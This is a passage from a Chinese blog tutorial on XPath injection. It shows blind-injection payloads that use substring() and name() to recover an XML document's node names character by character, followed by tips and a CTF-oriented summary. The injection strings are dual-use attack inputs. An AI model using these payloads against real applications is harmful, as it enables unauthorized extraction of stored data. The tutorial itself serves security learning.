+<figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">u</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&#x27; or substring(name(/*[1]), 1, 1)=&#x27;a&#x27; or &#x27;1&quot;</span><br></code></pre></td></tr></table></figure><br />
+遍历完所有的 ascii 字符后，判断出第一个根节点的名字的第一个字符。<br />
+当<br />
+<figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">u</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&#x27; or substring(name(/*[1]), 1, 1)=&#x27;r&#x27; or &#x27;1&quot;</span><br></code></pre></td></tr></table></figure><br />
+返回正常，说明第一个根节点的名字的第一个字符为 <code>r</code>。按照这个方法，可以判断出根节点名称为<code>root</code>。<br />
+按照上述步骤，可知 root 下的子节点数为 2，第一个子节点的名称为 <code>users</code>，第二个为 <code>secret</code>...不断重复上述过程，即可拿到完整的 XML 文件。</li>
+</ol>
+<h2 id="技巧">技巧</h2>
+<p>XPath 中有很多函数、Axes 可以替代类似<code>/</code>路径的作用，例如<code>root()</code>返回根节点、<code>child</code>选取当前节点的所有子元素等等。</p>
+<p>Axes 在这找：<a target="_blank" rel="noopener" href="https://www.runoob.com/xpath/xpath-axes.html">传送门🚪</a></p>
+<p>函数可以在这里找找：<a target="_blank" rel="noopener" href="https://www.runoob.com/xpath/xpath-functions.html">传送门🚪</a></p>
+<h2 id="总结">总结</h2>
+<p>XPath 注入和 SQl 注入特别类似，比较简单。目前我只在 CTF 中遇到过一次，现实中倒是没有遇见过。</p>
+<br>
+<p style="text-align: center;">
+<font size="2px" color="gray">来呀快活呀</font><br />
+<img src="https://clean-1252075454.cos.ap-nanjing.myqcloud.com/20200528120800990.png" srcset="https://blog-theme-source-1252075454.cos.ap-nanjing.myqcloud.com/img/loading.gif" lazyload style="zoom:30%" />
+</p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/%E7%BB%8F%E9%AA%8C%E6%80%BB%E7%BB%93/" class="category-chain-item">经验总结</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/Web/">#Web</a>
+      
+        <a href="/tags/%E6%B3%A8%E5%85%A5/">#注入</a>
+      
+        <a href="/tags/XPath/">#XPath</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>XPath 注入指北</div>
+      <div>https://www.tr0y.wang/2019/05/11/XPath注入指北/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>Tr0y</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2019年5月11日</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>更新于</div>
+          <div>2023年12月13日</div>
+        </div>
+      
+      <div class="license-meta-item">
+        <div>许可协议</div>
+        <div>
+          
+            
+            
+              <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+              <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                <i class="iconfont icon-by"></i>
+              </span>
+              </a>
+            
+          
+        </div>
+      </div>
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2019/05/13/OWASP-Top10-%E7%B3%BB%E5%88%97%E4%B9%8BOS%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/" title="OWASP Top10 系列之 OS 命令注入">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">OWASP Top10 系列之 OS 命令注入</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2019/05/11/OWASP-Top10-%E7%B3%BB%E5%88%97%E4%B9%8BXPath%E6%B3%A8%E5%85%A5/" title="OWASP Top10 系列之 XPath 注入">
+                        <span class="hidden-mobile">OWASP Top10 系列之 XPath 注入</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  <article id="comments" lazyload>
+    
+  <script type="text/javascript">
+    Fluid.utils.loadComments('#comments', function() {
+      var light = 'github-light';
+      var dark = 'github-dark';
+      var schema = document.documentElement.getAttribute('data-user-color-scheme');
+      if (schema === 'dark') {
+        schema = dark;
+      } else {
+        schema = light;
+      }
+      window.UtterancesThemeLight = light;
+      window.UtterancesThemeDark = dark;
+      var s = document.createElement('script');
+      s.setAttribute('src', 'https://utteranc.es/client.js');
+      s.setAttribute('repo', 'Macr0phag3/Macr0phag3.github.io');
+      s.setAttribute('issue-term', 'title');
+      
+      s.setAttribute('label', 'comment');
+      
+      s.setAttribute('theme', schema);
+      s.setAttribute('crossorigin', 'anonymous');
+      document.getElementById('comments').appendChild(s);
+    })
+  </script>
+  <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+  </article>
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+  
+  
+
+
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="leancloud-site-pv-container" style="display: none">
+        总访问量 
+        <span id="leancloud-site-pv"></span>
+         次
+      </span>
+    
+    
+      <span id="leancloud-site-uv-container" style="display: none">
+        总访客数 
+        <span id="leancloud-site-uv"></span>
+         人
+      </span>
+    
+    
+
+  
+</div>
+
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":true,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      headingSelector : CONFIG.toc.headingSelector || 'h1,h2,h3,h4,h5,h6',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      collapseDepth   : CONFIG.toc.collapseDepth || 0,
+      scrollSmooth    : true,
+      headingsOffset  : -boardTop
+    });
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.10/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  
+      <script>
+        if (!window.MathJax) {
+          window.MathJax = {
+            tex    : {
+              inlineMath: { '[+]': [['$', '$']] }
+            },
+            loader : {
+              load: ['ui/lazy']
+            },
+            options: {
+              renderActions: {
+                insertedScript: [200, () => {
+                  document.querySelectorAll('mjx-container').forEach(node => {
+                    let target = node.parentNode;
+                    if (target.nodeName.toLowerCase() === 'li') {
+                      target.parentNode.classList.add('has-jax');
+                    }
+                  });
+                }, '', false]
+              }
+            }
+          };
+        } else {
+          MathJax.startup.document.state(0);
+          MathJax.texReset();
+          MathJax.typeset();
+          MathJax.typesetPromise();
+        }
+      </script>
+    
+
+  <script  src="https://lib.baomitu.com/mathjax/3.2.1/es5/tex-mml-chtml.js" ></script>
+
+  <script defer src="/js/leancloud.js" ></script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
